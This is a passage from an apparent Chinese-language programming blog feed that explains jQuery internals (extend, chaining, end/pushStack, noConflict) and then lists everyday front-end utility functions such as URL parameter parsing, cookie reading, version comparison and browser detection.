copyIsArray = <strong>false</strong>;</p><p>​            <strong>clone</strong> = src &amp;&amp; jQuery.isArray(src) ? src : [];</p><p>​            <em>// 对象</em></p><p>​          } <strong>else</strong> {</p><p>​            <strong>clone</strong> = src &amp;&amp; jQuery.isPlainObject(src) ? src : {};</p><p>​          }</p><p>​          <em>// Never move original objects, clone them</em></p><p>​          <em>// 递归</em></p><p>​          target[name] = jQuery.extend(deep, <strong>clone</strong>, copy);</p><p>​          <em>// Don’t bring in undefined values</em></p><p>​          <em>// 最终都会到这条分支</em></p><p>​          <em>// 简单的值覆盖</em></p><p>​        } <strong>else</strong> <strong>if</strong> (copy !== undefined) {</p><p>​          target[name] = copy;</p><p>​        }</p><p>​      }</p><p>​    }</p><p>  }</p><p>  <em>// Return the modified object</em></p><p>  <em>// 返回新的 target</em></p><p>  <em>// 如果 i &lt; length ，是直接返回没经过处理的 target，也就是 arguments[0]</em></p><p>  <em>// 也就是如果不传需要覆盖的源，调用 $.extend 其实是增加 jQuery 的静态方法</em></p><p>  <strong>return</strong> target;</p><p>};</p></blockquote><p>需要注意的是这一句 jQuery.extend = jQuery.fn.extend = function() {} ，也就是 jQuery.extend 的实现和 jQuery.fn.extend 的实现共用了同一个方法，但是为什么能够实现不同的功能了，这就要归功于 Javascript 强大（怪异？）的 this 了。</p><p>1）在 jQuery.extend() 中，this 的指向是 jQuery 对象(或者说是 jQuery 类)，所以这里扩展在 jQuery 上；</p><p>2）在 jQuery.fn.extend() 中，this 的指向是 fn 对象，前面有提到 jQuery.fn = jQuery.prototype ，也就是这里增加的是原型方法，也就是对象方法。</p><h2 id="jQuery-的链式调用及回溯"><a href="#jQuery-的链式调用及回溯" class="headerlink" title="jQuery 的链式调用及回溯"></a><strong>jQuery 的链式调用及回溯</strong></h2><p>另一个让大家喜爱使用 jQuery 的原因是它的链式调用，这一点的实现其实很简单，只需要在要实现链式调用的方法的返回结果里，返回 this ，就能够实现链式调用了。</p><p>当然，除了链式调用，jQuery 甚至还允许回溯，看看：</p><blockquote><p><em>// 通过 end() 方法终止在当前链的最新过滤操作，返回上一个对象集合</em></p><p>$(‘div’).eq(0).show().<strong>end</strong>().eq(1).hide();</p></blockquote><p>当选择了 (‘div’).eq(0) 之后使用 end() 可以回溯到上一步选中的 jQuery 对象 $(‘div’)，其内部实现其实是依靠添加了 prevObject 这个属性：</p><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm6vkn6bzqj30hs048dfs.jpg" alt="图片"></p><p>jQuery 完整的链式调用、增栈、回溯通过 return this 、 return this.pushStack() 、return this.prevObject 实现，看看源码实现：</p><blockquote><p>jQuery.fn = jQuery.prototype = {</p><p>  <em>// 将一个 DOM 元素集合加入到 jQuery 栈</em></p><p>  <em>// 此方法在 jQuery 的 DOM 操作中被频繁的使用, 如在 parent(), find(), filter() 中</em></p><p>  <em>// pushStack() 方法通过改变一个 jQuery 对象的 prevObject 属性来跟踪链式调用中前一个方法返回的 DOM 结果集合</em></p><p>  <em>// 当我们在链式调用 end() 方法后, 内部就返回当前 jQuery 对象的 prevObject 属性</em></p><p>  pushStack: <strong>function</strong>(elems) {</p><p>​    <em>// 构建一个新的jQuery对象，无参的 this.constructor()，只是返回引用this</em></p><p>​    <em>// jQuery.merge 把 elems 节点合并到新的 jQuery 对象</em></p><p>​    <em>// this.constructor 就是 jQuery 的构造函数 jQuery.fn.init，所以 this.constructor() 返回一个 jQuery 对象</em></p><p>​    <em>// 由于 jQuery.merge 函数返回的对象是第二个函数附加到第一个上面，所以 ret 也是一个 jQuery 对象，这里可以解释为什么 pushStack 出入的 DOM 对象也可以用 CSS 方法进行操作</em></p><p>​    <strong>var</strong> ret = jQuery.merge(<strong>this</strong>.constructor(), elems);</p><p>​    <em>// 给返回的新 jQuery 对象添加属性 prevObject</em></p><p>​    <em>// 所以也就是为什么通过 prevObject 能取到上一个合集的引用了</em></p><p>​    ret.prevObject = <strong>this</strong>;</p><p>​    ret.context = <strong>this</strong>.context;</p><p>​    <em>// Return the newly-formed element set</em></p><p>​    <strong>return</strong> ret;</p><p>  },</p><p>  <em>// 回溯链式调用的上一个对象</em></p><p>  <strong>end</strong>: <strong>function</strong>() {</p><p>​    <em>// 回溯的关键是返回 prevObject 属性</em></p><p>​    <em>// 而 prevObject 属性保存了上一步操作的 jQuery 对象集合</em></p><p>​    <strong>return</strong> <strong>this</strong>.prevObject || <strong>this</strong>.constructor(<strong>null</strong>);</p><p>  },</p><p>  <em>// 取当前 jQuery 对象的第 i 个</em></p><p>  eq: <strong>function</strong>(i) {</p><p>​    <em>// jQuery 对象集合的长度</em></p><p>​    <strong>var</strong> len = <strong>this</strong>.length,</p><p>​      j = +i + (i &lt; 0 ? len : 0);</p><p>​    <em>// 利用 pushStack 返回</em></p><p>​    <strong>return</strong> <strong>this</strong>.pushStack(j &gt;= 0 &amp;&amp; j &lt; len ? [<strong>this</strong>[j]] : []);</p><p>  },</p><p>}</p></blockquote><p>总的来说，</p><p>1）end() 方法返回 prevObject 属性，这个属性记录了上一步操作的 jQuery 对象合集；</p><p>2）而 prevObject 属性由 pushStack() 方法生成，该方法将一个 DOM 元素集合加入到 jQuery 内部管理的一个栈中，通过改变 jQuery 对象的 prevObject 属性来跟踪链式调用中前一个方法返回的 DOM 结果集合</p><p>3）当我们在链式调用 end() 方法后，内部就返回当前 jQuery 对象的 prevObject 属性，完成回溯。</p><h2 id="正则与细节优化"><a href="#正则与细节优化" class="headerlink" title="正则与细节优化"></a><strong>正则与细节优化</strong></h2><p>不得不提 jQuery 在细节优化上做的很好。也存在很多值得学习的小技巧，下一篇将会以 jQuery 中的一些编程技巧为主题行文，这里就不再赘述。</p><p>然后想谈谈正则表达式，jQuery 当中用了大量的正则表达式，我觉得如果研读 jQuery ，正则水平一定能够大大提升，如果是个正则小白，我建议在阅读之前先去了解以下几点：</p><p>1）了解并尝试使用 Javascript 正则相关 API，包括了 test() 、replace() 、match() 、exec() 的用法；</p><p>2）区分上面 4 个方法，哪个是 RegExp 对象方法，哪个是 String 对象方法；</p><p>3）了解简单的零宽断言，了解什么是匹配但是不捕获以及匹配并且捕获。</p><h2 id="变量冲突处理"><a href="#变量冲突处理" class="headerlink" title="变量冲突处理"></a><strong>变量冲突处理</strong></h2><p>最后想提一提 jQuery 变量的冲突处理，通过一开始保存全局变量的 window.jQuery 以及 windw.$ 。</p><p>当需要处理冲突的时候，调用静态方法 noConflict()，让出变量的控制权，源码如下：</p><blockquote><p>(function(window, undefined) {</p><p>​    var</p><p>​        // Map over jQuery in case of overwrite</p><p>​        // 设置别名，通过两个私有变量映射了 window 环境下的 jQuery 和 $ 两个对象，以防止变量被强行覆盖</p><p>​        _jQuery = window.jQuery,</p><p>​        _$ = window.$;</p><p>​    jQuery.extend({</p><p>​        // noConflict() 方法让出变量 $ 的 jQuery 控制权，这样其他脚本就可以使用它了</p><p>​        // 通过全名替代简写的方式来使用 jQuery </p><p>​        // deep – 布尔值，指示是否允许彻底将 jQuery 变量还原(移交 $ 引用的同时是否移交 jQuery 对象本身)</p><p>​        noConflict: function(deep) {</p><p>​            // 判断全局 $ 变量是否等于 jQuery 变量</p><p>​            // 如果等于，则重新还原全局变量 $ 为 jQuery 运行之前的变量（存储在内部变量 _$ 中）</p><p>​            if (window.$ === jQuery) {</p><p>​                // 此时 jQuery 别名 $ 失效</p><p>​                window.$ = _$;</p><p>​            }</p><p>​            // 当开启深度冲突处理并且全局变量 jQuery 等于内部 jQuery，则把全局 jQuery 还原成之前的状况</p><p>​            if (deep &amp; window.jQuery === jQuery) {</p><p>​                // 如果 deep 为 true，此时 jQuery 失效</p><p>​                window.jQuery = _jQuery;</p><p>​            }</p><p>​            // 这里返回的是 jQuery 库内部的 jQuery 构造函数（new jQuery.fn.init()） </p><p>​            // 像使用 $ 一样尽情使用它吧</p><p>​            return jQuery;</p><p>​        }</p><p>​    })</p><p>}(window)</p></blockquote><p>画了一幅简单的流程图帮助理解：</p><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm6vk0p9h7j30hs071q31.jpg" alt="图片"></p><p>那么让出了这两个符号之后，是否就不能在我们的代码中使用 jQuery 或者呢 $ 呢？莫慌，还是可以使用的：</p><blockquote><p><em>// 让出 jQuery 、$ 的控制权不代表不能使用 jQuery 和 $ ，方法如下：</em></p><p><strong>var</strong> query = jQuery.noConflict(<strong>true</strong>);</p><p>(<strong>function</strong>($) {</p><p><em>// 插件或其他形式的代码，也可以将参数设为 jQuery</em></p><p>})(query);</p><p><em>// … 其他用 $ 作为别名的库的代码</em></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> JQuery </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> JQuery </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端常用工具类方法</title>
      <link href="2020/10/22/%E5%89%8D%E7%AB%AF%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E7%B1%BB%E6%96%B9%E6%B3%95/"/>
      <url>2020/10/22/%E5%89%8D%E7%AB%AF%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E7%B1%BB%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在日常开发中，我们经常会用一些工具类方法来实现业务逻辑 下面列举几种最常用的</p><h2 id="URL截取参数"><a href="#URL截取参数" class="headerlink" title="URL截取参数"></a>URL截取参数</h2><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//直接调用输入想要截取的参数名称几个</span><span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">getParamFromUrl</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token operator">===</span> undefined<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> search <span class="token operator">=</span> location<span class="token punctuation">.</span>search<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> mReg <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span><span class="token string">'(^|&amp;)'</span> <span class="token operator">+</span> key <span class="token operator">+</span> <span class="token string">'=([^&amp;]*)(&amp;|$)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> mValue <span class="token operator">=</span> search<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>mReg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>mValue <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token function">unescape</span><span class="token punctuation">(</span>mValue<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//示例</span><span class="token keyword">let</span> city <span class="token operator">=</span> <span class="token function">getParamFromUrl</span><span class="token punctuation">(</span><span class="token string">'city'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="JSON是否为空判断"><a href="#JSON是否为空判断" class="headerlink" title="JSON是否为空判断"></a>JSON是否为空判断</h2><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//输入想要检测的json数据 如果为空返回返回false</span><span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">isNullObject</span><span class="token punctuation">(</span>model<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> model <span class="token operator">===</span> <span class="token string">"object"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> hasProp <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> prop <span class="token keyword">in</span> model<span class="token punctuation">)</span> <span class="token punctuation">{</span>        hasProp <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>hasProp<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>      <span class="token keyword">throw</span> <span class="token string">"model is not object"</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gj7n0vgtupj30gc07awf2.jpg" alt="image-20200929171431032">  </p><h2 id="数据类型检测"><a href="#数据类型检测" class="headerlink" title="数据类型检测"></a>数据类型检测</h2><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//检测变量的数据类型</span><span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">getParamType</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>item <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>item <span class="token operator">===</span> undefined<span class="token punctuation">)</span> <span class="token keyword">return</span> undefined<span class="token punctuation">;</span>    <span class="token keyword">return</span> Object<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>toString<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//返回String Function Boolean Object Number</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gj7my4rsx8j30ea05q0t1.jpg" alt="image-20200929171150164">  </p><h2 id="获取cookie"><a href="#获取cookie" class="headerlink" title="获取cookie"></a>获取cookie</h2><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//获取document下cookie的具体某个参数值</span><span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">getCookie</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token operator">===</span> undefined<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> undefined<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">let</span> cookies <span class="token operator">=</span> document<span class="token punctuation">.</span>cookie<span class="token punctuation">;</span>    <span class="token keyword">let</span> mReg <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span><span class="token string">'(^|;)\\s*'</span> <span class="token operator">+</span> key <span class="token operator">+</span> <span class="token string">'=([^;]*)(;|$)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> mValue <span class="token operator">=</span> cookies<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>mReg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> ret <span class="token operator">=</span> undefined<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>mValue <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        ret <span class="token operator">=</span> <span class="token function">unescape</span><span class="token punctuation">(</span>mValue<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>ret <span class="token operator">!==</span> undefined<span class="token punctuation">)</span> <span class="token punctuation">{</span>        ret <span class="token operator">=</span> ret<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token operator">^</span>\"<span class="token operator">|</span>\<span class="token string">'/i, '</span><span class="token string">').replace(/\"|\'$/i, '</span>'<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> ret<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gj8h13se2pj30vk07a75u.jpg" alt="image-20200930103240035"></p><h2 id="版本号对比"><a href="#版本号对比" class="headerlink" title="版本号对比"></a>版本号对比</h2><p>一般在做APP端开发的时候需要用到一些版本控制，那么就需要针对版本号来进行对比，高版本或者低版本做一些特殊的逻辑处理，下面就是提供版本对比的方法</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//传入要对比的版本号，一般前面一个传入当前的版本号，后面一个写上要对比的版本号</span><span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">versionCompare</span><span class="token punctuation">(</span>higher<span class="token punctuation">,</span> lower<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> sep <span class="token operator">=</span> arguments<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> arguments<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">!==</span> undefined <span class="token operator">?</span> arguments<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string">'.'</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> higherAry <span class="token operator">=</span> higher<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span>sep<span class="token punctuation">)</span><span class="token punctuation">,</span>        lowerAry <span class="token operator">=</span> lower<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span>sep<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> l <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>higherAry<span class="token punctuation">.</span>length<span class="token punctuation">,</span> lowerAry<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> l<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">let</span> high <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>higherAry<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> low <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>lowerAry<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>high <span class="token operator">></span> low<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>high <span class="token operator">&lt;</span> low<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//返回值  higher > lower: 1;higher = lower: 0;higher &lt; lower:-1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gj8h6ipph7j30gi06ugm2.jpg" alt="image-20200930103754427">  </p><h2 id="数组去重"><a href="#数组去重" class="headerlink" title="数组去重"></a>数组去重</h2><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">arrayUniq</span><span class="token punctuation">(</span>array<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">let</span> temp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> array<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>temp<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>array<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            temp<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>array<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> temp<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gj8hib3udej30e805umxg.jpg" alt="image-20200930104914363">  </p><h2 id="iPhone-X系列机型判断"><a href="#iPhone-X系列机型判断" class="headerlink" title="iPhone X系列机型判断"></a>iPhone X系列机型判断</h2><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">isIphoneX</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// iPhone X、iPhone XS</span>    <span class="token keyword">let</span> isIPhoneX <span class="token operator">=</span>        <span class="token regex">/iphone/gi</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>navigator<span class="token punctuation">.</span>userAgent<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>        window<span class="token punctuation">.</span>devicePixelRatio <span class="token operator">&amp;&amp;</span>        window<span class="token punctuation">.</span>devicePixelRatio <span class="token operator">===</span> <span class="token number">3</span> <span class="token operator">&amp;&amp;</span>        window<span class="token punctuation">.</span>screen<span class="token punctuation">.</span>width <span class="token operator">===</span> <span class="token number">375</span> <span class="token operator">&amp;&amp;</span>        window<span class="token punctuation">.</span>screen<span class="token punctuation">.</span>height <span class="token operator">===</span> <span class="token number">812</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// iPhone XS Max</span>    <span class="token keyword">let</span> isIPhoneXSMax <span class="token operator">=</span>        <span class="token regex">/iphone/gi</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>navigator<span class="token punctuation">.</span>userAgent<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>        window<span class="token punctuation">.</span>devicePixelRatio <span class="token operator">&amp;&amp;</span>        window<span class="token punctuation">.</span>devicePixelRatio <span class="token operator">===</span> <span class="token number">3</span> <span class="token operator">&amp;&amp;</span>        window<span class="token punctuation">.</span>screen<span class="token punctuation">.</span>width <span class="token operator">===</span> <span class="token number">414</span> <span class="token operator">&amp;&amp;</span>        window<span class="token punctuation">.</span>screen<span class="token punctuation">.</span>height <span class="token operator">===</span> <span class="token number">896</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// iPhone XR</span>    <span class="token keyword">let</span> isIPhoneXR <span class="token operator">=</span>        <span class="token regex">/iphone/gi</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>navigator<span class="token punctuation">.</span>userAgent<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>        window<span class="token punctuation">.</span>devicePixelRatio <span class="token operator">&amp;&amp;</span>        window<span class="token punctuation">.</span>devicePixelRatio <span class="token operator">===</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span>        window<span class="token punctuation">.</span>screen<span class="token punctuation">.</span>width <span class="token operator">===</span> <span class="token number">414</span> <span class="token operator">&amp;&amp;</span>        window<span class="token punctuation">.</span>screen<span class="token punctuation">.</span>height <span class="token operator">===</span> <span class="token number">896</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>isIPhoneX <span class="token operator">||</span> isIPhoneXSMax <span class="token operator">||</span> isIPhoneXR<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="浏览器内核检测"><a href="#浏览器内核检测" class="headerlink" title="浏览器内核检测"></a>浏览器内核检测</h2><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">checkBrowser</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> u <span class="token operator">=</span> navigator<span class="token punctuation">.</span>userAgent<span class="token punctuation">;</span>  <span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>    trident<span class="token punctuation">:</span> u<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"Trident"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//IE内核</span>    presto<span class="token punctuation">:</span> u<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"Presto"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//opera内核</span>    webKit<span class="token punctuation">:</span> u<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"AppleWebKit"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//苹果、谷歌内核</span>    gecko<span class="token punctuation">:</span> u<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"Gecko"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> u<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"KHTML"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//火狐内核</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">[</span>Object<span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gjufjdyyi2j304g019jr9.jpg" alt="image-20201019102326521"></p><h2 id="localStorage相关处理"><a href="#localStorage相关处理" class="headerlink" title="localStorage相关处理"></a>localStorage相关处理</h2><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//localStorage取值</span><span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token 